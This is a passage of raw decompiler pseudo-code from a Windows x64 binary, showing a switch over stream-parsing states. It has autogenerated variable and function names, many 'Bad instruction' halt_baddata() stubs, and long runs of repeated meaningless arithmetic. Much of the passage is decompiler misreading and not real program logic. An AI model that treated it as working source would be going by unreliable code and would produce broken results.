unaff_RSI);\n            unaff_RDI = ppiVar63;\n            if (*(piStack56 + 0x22) == iVar46) {\n                uVar44 = uStack0000000000000045;\n                if (uStack0000000000000045 != 0) goto joined_r0x000140041bef;\n                if (*(piStack56 + 0xb) < 1) goto code_r0x000140041be0;\n                _Stack0000000000000040 = CONCAT15(1, Stack0000000000000040);\n                uStack0000000000000044 = in_stack_00000040 >> 0x20 & 0xffff0000 | _Stack0000000000000040 >> 0x20;\n                uStack48 = uStack48 & 0xffffffff;\n                in_stack_00000040 = CONCAT44(uStack0000000000000044, uStack48._4_4_);\n                goto code_r0x0001400418d6;\n            }\n            if (*(piStack56 + 4) == 0) goto code_r0x000140041be0;\n            uVar44 = *(piStack56 + 4);\n            if ((*(piStack56 + 0x24) != iVar46) || (uVar44 = uStack0000000000000045,  uStack0000000000000045 != 0))\n            goto joined_r0x000140041bef;\n            if (uStack48._4_4_ == 0) {\n                uVar44 = 0;\n                goto joined_r0x000140041bef;\n            }\n            ppiVar63 = in_stack_00000060 + 1;\n            if (in_stack_00000058 == in_stack_00000000) {\n                ppiVar83 = 0xf;\n            }\n            else {\n                ppiVar83 = CONCAT62(in_stack_0000006a, CONCAT11(in_stack_00000069, in_stack_00000068));\n            }\n            if (ppiVar83 < ppiVar63) {\n                fcn.1400a9390(in_stack_00000028, in_stack_00000060, 0, 0);\n            }\n            *(in_stack_00000058 + ppiVar60) = uStack48 >> 0x20;\n            uStack48 = uStack48 & 0xffffffff;\n            (in_stack_00000058 + 1)[ppiVar60] = 0;\n            piVar55 = arg1[2];\n            in_stack_00000060 = ppiVar63;\n            if (piVar55 < arg1[3]) goto code_r0x0001400418e4;\ncode_r0x000140041b2b:\n            (*(*arg1)[10])(arg1);\n        } while( true );\n    case 0x4d:\n        in(arg3);\n        goto code_r0x00014004184d;\n    case 0x4e:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4f:\n        *(uVar59 + 0x14010b1d6) = 0xf;\n        *0x640537996 = *0x640537996 + (uVar44 | *ppiVar60);\n        goto code_r0x0001400416db;\n    case 0x50:\n        puStack16 = piStack56 + 100;\n        if (piStack56[8] == 0) {\n            in_stack_00000040 = in_stack_00000040 & 0xffffffffffffff;\n        }\n        else {\n            in_stack_00000040 = in_stack_00000040 & 0xffffffffffffff | (piStack56[10] != 0) << 0x38;\n        }\n        in_stack_00000068 = 0;\n        in_stack_00000058 = &stack0x00000068;\n        in_stack_00000060 = NULL;\n        if (*(piStack56 + 4) != '\\0') {\n            fcn.1400a9080(&stack0x00000058, 0x20);\n        }\n        in_stack_00000078 = &stack0x00000088;\n        in_stack_00000080 = NULL;\n        in_stack_00000088 = 0;\n        puStack24 = in_stack_00000078;\n        fcn.1400a9080(&stack0x00000078, 0x20);\n        uStack0000000000000044 = in_stack_00000040 >> 0x20 & 0xffff00ff;\n        _auStack40 = CONCAT88(SUB168(_auStack40 >> 0x40, 0), piStack56 + 0x66) & 0xffffffffffffffff;\n        in_stack_00000054 = *(piStack56 + 0xc);\n        in_stack_00000040 = (uStack0000000000000044 & 0xff00ffff) << 0x20;\n        puVar56 = auStack104;\n        do {\n            if (*(*(puVar56 + 0x78) + *(puVar56 + 0x48)) < 5) {\n    // WARNING: Could not recover jumptable at 0x000140040332. Too many branches\n    // WARNING: Treating indirect jump as call\n                ppiVar63 = (*(*(*(*(puVar56 + 0x78) + *(puVar56 + 0x48)) * 4 + 0x14010b330) + 0x14010b330))();\n                return ppiVar63;\n            }\n            unaff_R14 = 0x1;\ncode_r0x00014004060d:\n            uVar49 = unaff_RDI;\n            iVar52 = *(puVar56 + 0x48);\n            *(puVar56 + 0x48) = iVar52 + 1;\n            uVar44 = unaff_R14;\n        } while ((iVar52 + 1 < 4 & uVar44) != 0);\n        if ((1 < *(puVar56 + 0x60) & uVar44) != 0) {\n            if (puVar56[0xae] == '\\0') {\n                unaff_R15 = *(*(puVar56 + 0x30) + 0x38);\n            }\n            else {\n                unaff_R15 = *(*(puVar56 + 0x30) + 0x48);\n            }\n            unaff_R14 = 0x1;\n            goto code_r0x000140040380;\n        }\n        if (uVar44 == 0) {\ncode_r0x0001400408b5:\n            bVar86 = uVar49 == 0xffff;\n            goto code_r0x0001400408bd;\n        }\n        uVar59 = *(puVar56 + 0xe8);\njoined_r0x000140040c6f:\n        if (1 < uVar59) {\n            *(puVar56 + -8) = 0x140040f05;\n            uVar59 = fcn.14002f7b0(*(puVar56 + 0x88), 0x30, 0);\n            if (uVar59 != 0) {\n                uVar62 = *(puVar56 + 0xe8);\n                if (uVar59 == 0xffffffffffffffff) {\n                    uVar59 = uVar62 - 1;\n                    if (uVar62 == 0) {\n                        **(puVar56 + 0xe0) = 0;\n                    }\n                    else if (uVar59 != 0) goto code_r0x000140040f20;\n                }\n                else {\ncode_r0x000140040f20:\n                    if (uVar59 <= uVar62) {\n                        uVar62 = uVar59;\n                    }\n                    *(puVar56 + -8) = 0x140040f36;\n                    fcn.1400a9130(*(puVar56 + 0x88), 0, uVar62);\n                }\n            }\n        }\n        if ((puVar56[0xae] != '\\0') && (**(puVar56 + 0xe0) != '0')) {\n            *(puVar56 + 0x20) = 0x2d;\n            *(puVar56 + -8) = 0x140040cac;\n            fcn.1400a76a0(*(puVar56 + 0x88), 0, 0, 1);\n        }\n        iVar52 = *(puVar56 + 200);\n        if (iVar52 != 0) {\n            uVar88 = puVar56[0xa8];\n            if (puVar56[0xad] == '\\0') {\n                uVar88 = puVar56[0x3c];\n            }\n            iVar57 = *(puVar56 + 0xc0);\n            if (iVar57 == *(puVar56 + 0x68)) {\n                uVar59 = 0xf;\n            }\n            else {\n                uVar59 = *(puVar56 + 0xd0);\n            }\n            if (uVar59 < iVar52 + 1U) {\n                *(puVar56 + 0x20) = 1;\n                *(puVar56 + -8) = 0x140041209;\n                fcn.1400a9390(*(puVar56 + 0x90), iVar52, 0, 0);\n                iVar57 = *(puVar56 + 0xc0);\n            }\n            *(iVar57 + iVar52) = uVar88;\n            *(puVar56 + 200) = iVar52 + 1U;\n            uVar58 = *(puVar56 + 0x90);\n            *(*(puVar56 + 0xc0) + 1 + iVar52) = 0;\n            uVar5 = *(*(puVar56 + 0x30) + 0x18);\n            noname_0 = *(*(puVar56 + 0x30) + 0x10);\n            *(puVar56 + -8) = 0x140040d36;\n            cVar43 = fcn.1400b7670(noname_0, uVar5, uVar58);\n            if (cVar43 == '\\0') {\n                **(puVar56 + 0x178) = **(puVar56 + 0x178) | 4;\n            }\n        }\n        bVar86 = uVar49 == 0xffff;\n        if ((puVar56[0xad] != '\\0') && (*(*(puVar56 + 0x30) + 0x58) != *(puVar56 + 0x3c))) goto code_r0x0001400408bd;\n        *(puVar56 + -8) = 0x140040d7e;\n        fcn.1400a78c0(*(puVar56 + 0x180), *(puVar56 + 0x88));\n        bVar89 = arg1 != NULL && bVar86;\n        if (arg1 == NULL || !bVar86) goto code_r0x0001400408d8;\n        break;\n    case 0x51:\n        unaff_RBP = &stack0xffffffffffffff90;\n        uStack120 = &stack0xffffffffffffff90;\n        puVar74 = auStack33927;\n        puVar81 = unaff_RDI + 0x14010b1d2;\n        bVar86 = 0xf < *puVar81;\n        *puVar81 = *puVar81 - 0x10;\ncode_r0x000140040572:\n        if (bVar86) {\n            *(puVar74 + 0x20) = 1;\n            *(puVar74 + -8) = 0x14004081f;\n            fcn.1400a9390(*(puVar74 + 0x88), unaff_RDI, 0, 0);\n            ppiVar60 = *(puVar74 + 0xe0);\n        }\n        *(ppiVar60 + unaff_RDI) = unaff_R13;\n        *(puVar74 + 0x3c) = *(puVar74 + 0x3c) + 1;\n        *(puVar74 + 0xe8) = unaff_R12;\n        *(*(puVar74 + 0xe0) + 1 + unaff_RDI) = 0;\ncode_r0x000140040596:\n        piVar55 = arg1[2];\n        if (arg1[3] <= piVar55) goto code_r0x0001400407eb;\ncode_r0x0001400405a4:\n        arg1[2] = piVar55 + 2;\n        do {\n            unaff_RDI = 0xffffffff;\n            unaff_R13 = 0x1;\n            cVar43 = '\\x01';\n            unaff_R12 = arg1 != NULL;\n            if (arg1 != NULL) {\n                if (arg1[2] < arg1[3]) {\n                    iVar46 = *arg1[2];\n                }\n                else {\n                    pcVar3 = (*arg1)[9];\n                    *(puVar74 + -8) = 0x140040f59;\n                    iVar46 = (*pcVar3)(arg1);\n                }\n                if (iVar46 == -1) {\n                    arg1 = NULL;\n                }\n                else {\n                    unaff_R12 = NULL;\n                }\n            }\n            else {\n                unaff_R12 = 0x1;\n            }\n            ppiVar60 = *(puVar74 + 0x3a) == -1;\n            bVar86 = unaff_RBP != NULL && *(puVar74 + 0x3a) == -1;\n            if (bVar86) {\n                if (unaff_RBP[2] < unaff_RBP[3]) {\n                    iVar46 = *unaff_RBP[2];\n                }\n                else {\n                    pcVar3 = *(*unaff_RBP + 0x48);\n                    *(puVar74 + -8) = 0x14004101f;\n                    iVar46 = (*pcVar3)(unaff_RBP);\n                }\n                if (iVar46 == -1) {\n                    unaff_RBP = NULL;\n                }\n                if (SUB81(unaff_R12, 0) != (iVar46 == -1 && bVar86)) goto code_r0x000140040505;\ncode_r0x0001400408a0:\n                uVar49 = unaff_RDI;\n                iVar52 = *(puVar74 + 0xe8);\n                unaff_R14 = 0x1;\n                puVar56 = puVar74;\njoined_r0x0001400408af:\n                if (iVar52 != 0) goto code_r0x00014004060d;\n                goto code_r0x0001400408b5;\n            }\ncode_r0x0001400404fc:\n            cVar43 = unaff_R13;\n            if (unaff_R12 == ppiVar60) goto code_r0x0001400408a0;\ncode_r0x000140040505:\n            uVar49 = unaff_RDI;\n            uVar48 = uVar49;\n            if ((arg1 != NULL) && (cVar43 != '\\0')) {\n                if (arg1[2] < arg1[3]) {\n                    uVar48 = *arg1[2];\n                }\n                else {\n                    pcVar3 = (*arg1)[9];\n                    *(puVar74 + -8) = 0x140040f49;\n                    uVar48 = (*pcVar3)(arg1);\n                }\n                if (uVar48 == 0xffff) {\n                    arg1 = NULL;\n                }\n            }\n            ppiVar63 = *(puVar74 + 0x40);\n            do {\n                if (uVar48 == *ppiVar63) {\n                    unaff_RDI = *(puVar74 + 0xe8);\n                    unaff_R12 = unaff_RDI + 1;\n                    unaff_R13 = *(*unaff_R15 + (ppiVar63 - *(puVar74 + 0x58) >> 1));\n                    ppiVar60 = *(puVar74 + 0xe0);\n                    ppiVar63 = *(puVar74 + 0xf0);\n                    if (ppiVar60 == *(puVar74 + 0x50)) {\n                        ppiVar63 = 0xf;\n                    }\n                    bVar86 = ppiVar63 < unaff_R12;\n                    goto code_r0x000140040572;\n                }\n                ppiVar63 = ppiVar63 + 2;\n            } while (ppiVar63 != unaff_RSI);\n            if (*(*(puVar74 + 0x30) + 0x22) == uVar48) {\n                if (puVar74[0xad] != '\\0') {\ncode_r0x0001400409da:\n                    unaff_R14 = puVar74[0xad];\n                    goto code_r0x0001400409e3;\n                }\n                if (*(*(puVar74 + 0x30) + 0x58) < 1) goto code_r0x0001400408a0;\n                uVar2 = *(puVar74 + 0x3c);\n                puVar74[0xad] = 1;\n                *(puVar74 + 0x3c) = 0;\n                *(puVar74 + 0xa8) = uVar2;\n                goto code_r0x000140040596;\n            }\n            uVar44 = *(*(puVar74 + 0x30) + 0x20);\n            unaff_R14 = uVar44;\n            if (uVar44 == 0) goto code_r0x0001400408a0;\n            if (*(*(puVar74 + 0x30) + 0x24) != uVar48) {\ncode_r0x0001400409e3:\n                iVar52 = *(puVar74 + 0xe8);\n                puVar56 = puVar74;\n                goto joined_r0x0001400408af;\n            }\n            if (puVar74[0xad] != '\\0') goto code_r0x0001400409da;\n            iVar80 = *(puVar74 + 0x3c);\n            if (iVar80 == 0) {\n                unaff_R14 = NULL;\n                goto code_r0x0001400409e3;\n            }\n            iVar52 = *(puVar74 + 200);\n            iVar57 = *(puVar74 + 0xc0);\n            if (iVar57 == *(puVar74 + 0x68)) {\n                uVar59 = 0xf;\n            }\n            else {\n                uVar59 = *(puVar74 + 0xd0);\n            }\n            if (uVar59 < iVar52 + 1U) {\n                *(puVar74 + 0x20) = 1;\n                *(puVar74 + -8) = 0x1400409bf;\n                fcn.1400a9390(*(puVar74 + 0x90), iVar52, 0, 0);\n                iVar57 = *(puVar74 + 0xc0);\n            }\n            *(iVar57 + iVar52) = iVar80;\n            *(puVar74 + 200) = iVar52 + 1U;\n            *(puVar74 + 0x3c) = 0;\n            *(*(puVar74 + 0xc0) + 1 + iVar52) = 0;\n            piVar55 = arg1[2];\n            if (piVar55 < arg1[3]) goto code_r0x0001400405a4;\ncode_r0x0001400407eb:\n            pcVar3 = (*arg1)[10];\n            *(puVar74 + -8) = 0x1400407f4;\n            (*pcVar3)(arg1);\n        } while( true );\n    case 0x52:\n        if (bVar89) goto code_r0x0001400404fc;\n        *ppiVar60 = *ppiVar60 + uVar44;\n        puVar74 = auStack104;\n        goto code_r0x0001400404fc;\n    case 0x53:\n        bVar86 = uVar51 == 0xffffffff;\n        do {\n            uVar59 = unaff_R12 & 0xffffffff;\n            if (bVar86) {\n                arg1 = NULL;\n            }\n            else {\n                uVar59 = 0;\n            }\n            while( true ) {\n                bVar86 = uStack48._2_2_ == -1;\n                bVar89 = unaff_RBP != NULL && bVar86;\n                if (bVar89) {\n                    if (unaff_RBP[2] < unaff_RBP[3]) {\n                        iVar46 = *unaff_RBP[2];\n                    }\n                    else {\n                        iVar46 = (**(*unaff_RBP + 0x48))(unaff_RBP);\n                    }\n                    bVar86 = iVar46 == -1 && bVar89;\n                    if (iVar46 == -1) {\n                        unaff_RBP = NULL;\n                    }\n                }\n                puVar56 = auStack104;\n                if (bVar86 == uVar59) goto code_r0x00014004060d;\n                if ((arg1 != NULL) && (unaff_R13 != '\\0')) {\n                    if (arg1[2] < arg1[3]) {\n                        iVar46 = *arg1[2];\n                    }\n                    else {\n                        iVar46 = (*(*arg1)[9])(arg1);\n                    }\n                    if (iVar46 == -1) {\n                        arg1 = NULL;\n                    }\n                }\n                cVar43 = (**(*piStackX8 + 0x10))();\n                puVar56 = auStack104;\n                if (cVar43 == '\\0') goto code_r0x00014004060d;\n                if (arg1[2] < arg1[3]) {\n                    arg1[2] = arg1[2] + 2;\n                }\n                else {\n                    (*(*arg1)[10])(arg1);\n                }\n                unaff_RDI = 0xffffffff;\n                unaff_R13 = 0x1;\n                unaff_R12 = arg1 != NULL;\n                if (arg1 != NULL) break;\n                uVar59 = 1;\n            }\n            if (arg1[2] < arg1[3]) {\n                iVar46 = *arg1[2];\n            }\n            else {\n                iVar46 = (*(*arg1)[9])(arg1);\n            }\n            bVar86 = iVar46 == -1;\n        } while( true );\n    case 0x54:\n        *ppiVar60 = *ppiVar60 + uVar44;\n        *ppiVar60 = *ppiVar60 + uVar44;\ncode_r0x000140040380:\n        while( true ) {\n            uVar49 = unaff_RDI;\n            bVar86 = uVar49 == 0xffff;\n            bVar79 = arg1 != NULL && bVar86;\n            bVar89 = bVar86;\n            if (bVar79) {\n                if (arg1[2] < arg1[3]) {\n                    iVar46 = *arg1[2];\n                }\n                else {\n                    pcVar3 = (*arg1)[9];\n                    *(puVar56 + -8) = 0x1400410e7;\n                    iVar46 = (*pcVar3)(arg1);\n                }\n                if (iVar46 == -1) {\n                    arg1 = NULL;\n                }\n                bVar89 = iVar46 == -1 && bVar79;\n            }\n            bVar79 = unaff_RBP != NULL && *(puVar56 + 0x3a) == -1;\n            if (bVar79) break;\n            if ((*(puVar56 + 0x3a) == -1) == bVar89) goto code_r0x000140040c58;\ncode_r0x0001400403bd:\n            if (*(puVar56 + 0x60) <= unaff_R14) goto code_r0x000140040c58;\n            uVar48 = uVar49;\n            if ((arg1 != NULL) && (bVar86)) {\n                if (arg1[2] < arg1[3]) {\n                    uVar48 = *arg1[2];\n                }\n                else {\n                    pcVar3 = (*arg1)[9];\n                    *(puVar56 + -8) = 0x14004121f;\n                    uVar48 = (*pcVar3)(arg1);\n                }\n                if (uVar48 == 0xffff) {\n                    arg1 = NULL;\n                }\n            }\n            if (*(unaff_R15 + unaff_R14 * 2) != uVar48) goto code_r0x0001400408bd;\n            if (arg1[2] < arg1[3]) {\n                arg1[2] = arg1[2] + 2;\n            }\n            else {\n                pcVar3 = (*arg1)[10];\n                *(puVar56 + -8) = 0x140040e72;\n                (*pcVar3)(arg1);\n            }\n            unaff_R14 = unaff_R14 + 1;\n            unaff_RDI = 0xffffffff;\n        }\n        if (unaff_RBP[2] < unaff_RBP[3]) {\n            iVar46 = *unaff_RBP[2];\n        }\n        else {\n            pcVar3 = *(*unaff_RBP + 0x48);\n            *(puVar56 + -8) = 0x1400411e5;\n            iVar46 = (*pcVar3)(unaff_RBP);\n        }\n        if (iVar46 == -1) {\n            unaff_RBP = NULL;\n        }\n        if ((iVar46 == -1 && bVar79) != bVar89) goto code_r0x0001400403bd;\ncode_r0x000140040c58:\n        if (unaff_R14 == *(puVar56 + 0x60)) {\n            uVar59 = *(puVar56 + 0xe8);\n            goto joined_r0x000140040c6f;\n        }\ncode_r0x0001400408bd:\n        **(puVar56 + 0x178) = **(puVar56 + 0x178) | 4;\n        bVar89 = arg1 != NULL & bVar86;\n        if (bVar89 == false) goto code_r0x0001400408d8;\n        break;\n    case 0x58:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x59:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x5a:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x5b:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x5c:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x5d:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x5f:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x60:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x61:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x62:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 99:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 100:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x65:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x66:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x67:\n        *ppiVar60 = *ppiVar60 + uVar44;\n        *0x14010db6d = *0x14010db6d + uVar44;\n        *ppiVar60 = *ppiVar60 + uVar44;\n        *(unaff_RBP + 0x28021b) = *(unaff_RBP + 0x28021b) + arg3;\n        *ppiVar60 = *ppiVar60 + uVar44;\n        *0x14010db7d = *0x14010db7d + uVar44;\n        *ppiVar60 = *ppiVar60 + uVar44;\n        *(arg1 + 0x28021b) = *(arg1 + 0x28021b) + cVar43;\n        *ppiVar60 = *ppiVar60 + uVar44;\n        *unaff_RSI = *unaff_RSI + -0x10;\n        *ppiVar60 = *ppiVar60 + uVar44;\n        *ppiVar60 = *ppiVar60 + uVar44;\n        *ppiVar60 = *ppiVar60 + uVar44;\n        *(arg1 + 0x28021b) = *(arg1 + 0x28021b) + cVar43;\n        *ppiVar60 = *ppiVar60 + uVar44;\n        *unaff_RSI = *unaff_RSI + -0x10;\n        *ppiVar60 = *ppiVar60 + uVar44;\n        *ppiVar60 = *ppiVar60 + uVar44;\n        *ppiVar60 = *ppiVar60 + uVar44;\n        *ppiVar60 = *ppiVar60 + uVar44;\n        *ppiVar60 = *ppiVar60 + uVar44;\n        *ppiVar60 = *ppiVar60 + uVar44;\n        *ppiVar60 = *ppiVar60 + uVar44;\n        *ppiVar60 = *ppiVar60 + uVar44;\n        *ppiVar60 = *ppiVar60 + uVar44;\n        *ppiVar60 = *ppiVar60 + uVar44;\n        *ppiVar60 = *ppiVar60 + uVar44;\n        *ppiVar60 = *ppiVar60 + uVar44;\n        *ppiVar60 = *ppiVar60 + uVar44;\n        *ppiVar60 = *ppiVar60 + uVar44;\n        *ppiVar60 = *ppiVar60 + uVar44;\n        *ppiVar60 = *ppiVar60 + uVar44;\n        *ppiVar60 = *ppiVar60 + uVar44;\n        *ppiVar60 = *ppiVar60 + uVar44;\n        *ppiVar60 = *ppiVar60 + uVar44;\n        *(arg3 + 0x28021b) = *(arg3 + 0x28021b) + -0x4f;\n        *ppiVar60 = *ppiVar60 + uVar44;\n        *(ppiVar60 * 2) = *(ppiVar60 * 2) + uVar44;\n        *ppiVar60 = *ppiVar60 + uVar44;\n        *ppiVar60 = *ppiVar60 + uVar44;\n        *ppiVar60 = *ppiVar60 + uVar44;\n        *unaff_RDI = uVar44;\n        *ppiVar60 = *ppiVar60 + uVar51;\n        *ppiVar60 = *ppiVar60 + uVar44;\n        *ppiVar60 = *ppiVar60 + uVar44;\n        *ppiVar60 = *ppiVar60 | uVar51;\n        *ppiVar60 = *ppiVar60 + uVar44;\n        *ppiVar60 = *ppiVar60 + uVar51;\n        *ppiVar60 = *ppiVar60 + uVar44;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x68:\n        cVar64 = *unaff_RDI + -0x10;\n        uVar44 = uVar44 + *ppiVar60;\n        pcVar53 = ppiVar60 & 0xffffffffffffff00 | uVar44;\n        pcVar53[-0x73] = pcVar53[-0x73] + cVar64;\n        *pcVar53 = *pcVar53 + uVar44;\n        pcVar53[-0x73] = pcVar53[-0x73] + cVar64;\n        *(pcVar53 * 9) = in_FS;\n        *pcVar53 = *pcVar53 + uVar44;\n        *(unaff_RBP + 0x31) = *(unaff_RBP + 0x31) + uVar44;\n        puVar81 = pcVar53 + -0x39;\n        *puVar81 = *puVar81 >> 4 | *puVar81 << 4;\n        uVar59 = uVar44 & 0xffffffffffffffc8;\n        pcVar53 = ppiVar60 & 0xffffffffffffff00 | uVar59;\n        cVar43 = uVar59;\n        *pcVar53 = *pcVar53 + cVar43;\n        *pcVar53 = *pcVar53 + cVar43;\n        *pcVar53 = *pcVar53 + cVar43;\n        *(arg1 + -0x73) = *(arg1 + -0x73) + cVar64;\n        goto code_r0x000140044f07;\n    case 0x69:\n        puVar65 = 0x14010b1ef;\n        if (!bVar89) {\n            return ppiVar60;\n        }\n        puVar81 = in_R11 + 0x43 + in_stack_00000038 * 4;\n        uVar87 = *puVar81;\n        uVar44 = *puVar81;\n        *puVar81 = (uVar44 + 0x11) - bVar86;\n        *unaff_RDI = *unaff_RDI + -0x11 + (uVar87 < 0xef || uVar44 + 0x11 < bVar86);\n        arg1 = arg1 & 0xffffffffffff0000 | CONCAT11(0x53, cVar43);\n    case 0x6a:\ncode_r0x000140044e68:\n        uVar50 = unaff_RBP;\n        fcn.1400ab0f0(puVar65, 0, in_stack_00000030, unaff_R15);\n        ppiVar60 = in_stack_00000038;\n        iVar52 = fcn.1400b6270(in_stack_00000038, *(arg1 + 0x24), arg1[2], arg1[3]);\n        ppiVar83 = iVar52 - ppiVar60 >> 1;\n        ppiVar63 = in_stack_00000040;\n        if (in_stack_00000040 < ppiVar83) goto code_r0x0001400454dc;\n        *(in_stack_00000038 + (iVar52 - ppiVar60)) = 0;\n        iVar80 = *(arg1 + 0xb);\n        in_stack_00000040 = ppiVar83;\ncode_r0x000140044ede:\n        ppiVar60 = in_stack_00000040;\n        if (iVar80 < 1) {\ncode_r0x000140044ee6:\n            puStackX16 = *(unaff_RSI + 3) & 0xffffffff000000b0;\n            unaff_R15 = auStack40._0_8_ + in_stack_00000040;\n            if ((*(unaff_RSI + 3) & 0x200) != 0) {\n                unaff_R15 = unaff_R15 + arg1[6];\n            }\ncode_r0x000140044f07:\n            ppiVar60 = &stack0x00000068;\n            puVar65 = &stack0x00000058;\n            in_stack_00000030 = NULL;\n            in_stack_00000060 = NULL;\n            arg3 = unaff_R15 * 2;\n            puStack24 = puVar65;\n            ppiVar83 = ppiVar60;\ncode_r0x000140044f34:\n            in_stack_00000068 = SUB81(in_stack_00000030, 0);\n            in_stack_00000069 = in_stack_00000030 >> 8;\n            in_stack_00000058 = ppiVar60;\n            fcn.1400acbc0(puVar65, arg3);\n            ppiVar60 = unaff_RSI[2];\n            puVar65 = &stack0x00000030 + 4;\n            bVar86 = puStackX16 == 0x10 && unaff_R15 < ppiVar60;\n            ppiVar78 = in_stack_00000060;\n            do {\n                if (*puVar65 < 5) {\n                    switch(*puVar65) {\n                    case 0:\n                        if (bVar86) {\ncode_r0x0001400450a7:\n                            ppiVar63 = ppiVar60 - unaff_R15;\n                            fcn.1400ab0f0(puStack24, ppiVar78, 0, ppiVar63);\n                            ppiVar78 = in_stack_00000060;\n                        }\n                        break;\n                    case 1:\ncode_r0x000140045040:\n                        if (bVar86) goto code_r0x0001400450a7;\n                        ppiVar84 = ppiVar78 + 1;\n                        if (in_stack_00000058 == ppiVar83) {\n                            ppiVar68 = 0x7;\n                        }\n                        else {\n                            ppiVar68 = CONCAT62(in_stack_0000006a, CONCAT11(in_stack_00000069, in_stack_00000068));\n                        }\n                        if (ppiVar68 < ppiVar84) {\n                            ppiVar63 = NULL;\n                            fcn.1400aced0(puStack24, ppiVar78, 0, 0);\n                        }\n                        *(in_stack_00000058 + ppiVar78 * 2) = uStack30;\n                        in_stack_00000060 = ppiVar84;\n                        *(in_stack_00000058 + ppiVar78 * 2 + 2) = 0;\n                        ppiVar78 = ppiVar84;\n                        break;\n                    case 2:\n                        if ((*(unaff_RSI + 0x19) & 2) != 0) {\n                            ppiVar84 = arg1[6];\n                            ppiVar68 = arg1[5];\n                            if (ppiVar84 <= 0x1fffffffffffffff - ppiVar78) goto code_r0x0001400450f6;\n                            fcn.1400bd360(0x14010b302);\n                            goto code_r0x000140045040;\n                        }\n                        break;\n                    case 3:\n                        if (auStack40._0_8_ != NULL) {\n                            uVar45 = *puStack16;\n                            ppiVar84 = ppiVar78 + 1;\n                            if (in_stack_00000058 == ppiVar83) {\n                                ppiVar68 = 0x7;\n                            }\n                            else {\n                                ppiVar68 = CONCAT62(in_stack_0000006a, CONCAT11(in_stack_00000069, in_stack_00000068));\n                            }\n                            if (ppiVar68 < ppiVar84) {\n                                ppiVar63 = NULL;\n                                fcn.1400aced0(puStack24, ppiVar78, 0, 0);\n                            }\n                            *(in_stack_00000058 + ppiVar78 * 2) = uVar45;\n                            in_stack_00000060 = ppiVar84;\n                            *(in_stack_00000058 + ppiVar78 * 2 + 2) = 0;\n                            ppiVar78 = ppiVar84;\n                        }\n                        break;\n                    case 4:\n                        ppiVar68 = in_stack_00000038;\n                        ppiVar84 = in_stack_00000040;\n                        if (0x1fffffffffffffff - ppiVar78 < in_stack_00000040) {\n                            auStack40._0_8_ = in_stack_00000040;\n                            fcn.1400bd360(0x14010b302);\n                            goto code_r0x0001400454b8;\n                        }\ncode_r0x0001400450f6:\n                        fcn.1400acd00(puStack24, ppiVar68, ppiVar84);\n                        ppiVar78 = in_stack_00000060;\n                    }\n                }\n                puVar65 = puVar65 + 1;\n            } while (uStack48 != puVar65);\n            if (auStack40._0_8_ < 2) {\ncode_r0x000140045126:\n                if (ppiVar78 < ppiVar60) {\n                    if (puStackX16 == 0x20) {\n                        fcn.1400ab0f0(puStack24, ppiVar78, 0, ppiVar60 - ppiVar78);\n                        ppiVar78 = ppiVar60;\n                    }\n                    else {\n                        fcn.1400ab0f0(puStack24, 0, 0, ppiVar60 - ppiVar78);\n                        ppiVar78 = ppiVar60;\n                    }\n                }\n                uVar59 = unaff_R13 & 0xffffffff;\n                if ((unaff_R13 == '\\0') &&\n                   (iVar52 = (**(*piStack56 + 0x60))(piStack56, in_stack_00000058, ppiVar78),  ppiVar78 != iVar52)) {\n                    uVar59 = 1;\n                }\n                if (in_stack_00000058 != ppiVar83) {\n                    fcn.1400bc6c0(in_stack_00000058);\n                }\n                if (in_stack_00000038 != in_stack_00000000) {\n                    fcn.1400bc6c0();\n                }\n                unaff_RSI[2] = NULL;\n                in_stack_000000c8[1] = unaff_R13 & 0xffffffffffffff00 | uVar59 & 0xff;\n                *in_stack_000000c8 = piStack56;\n                return in_stack_000000c8;\n            }\n            auStack40._0_8_ = auStack40._0_8_ - 1;\n            if (auStack40._0_8_ <= 0x1fffffffffffffff - ppiVar78) {\n                fcn.1400acd00(puStack24, puStack16 + 1, auStack40._0_8_);\n                ppiVar78 = in_stack_00000060;\n                goto code_r0x000140045126;\n            }\ncode_r0x0001400454c4:\n            fcn.1400bd360(0x14010b302);\n            unaff_R14 = auStack40._0_8_;\n        }\n        else {\n            ppiVar83 = in_stack_00000040 + 1;\n            puStack24 = puStack24 & 0xffffffffffff0000 | *(arg1 + 0x22);\n            if (in_stack_00000038 == in_stack_00000000) {\n                ppiVar63 = 0x7;\n            }\n            else {\n                ppiVar63 = CONCAT62(in_stack_0000004a, CONCAT11(in_stack_00000049, in_stack_00000048));\n            }\n            if (ppiVar63 < ppiVar83) {\n                fcn.1400aced0(uStack48, in_stack_00000040, 0, 0);\n            }\n            ppiVar63 = NULL;\n            *(in_stack_00000038 + ppiVar60 * 2) = puStack24._0_2_;\n            *(in_stack_00000038 + ppiVar60 * 2 + 2) = 0;\n            in_stack_00000040 = ppiVar83;\n            if (uVar50 < 0) {\n                auStack40._0_8_ = NULL;\n                ppiVar63 = -uVar50;\n                fcn.1400ab0f0(uStack48, ppiVar83, 0, ppiVar63);\n                if (unaff_R14 <= 0x1fffffffffffffff - in_stack_00000040) goto code_r0x000140045269;\ncode_r0x0001400454b8:\n                fcn.1400bd360(0x14010b302);\n                goto code_r0x0001400454c4;\n            }\n            unaff_R14 = *(arg1 + 0xb);\n            unaff_RDI = unaff_RDI + uVar50 * 2;\n            if (unaff_R14 <= 0x1fffffffffffffff - ppiVar83) {\ncode_r0x000140045269:\n                fcn.1400acd00(uStack48, unaff_RDI, 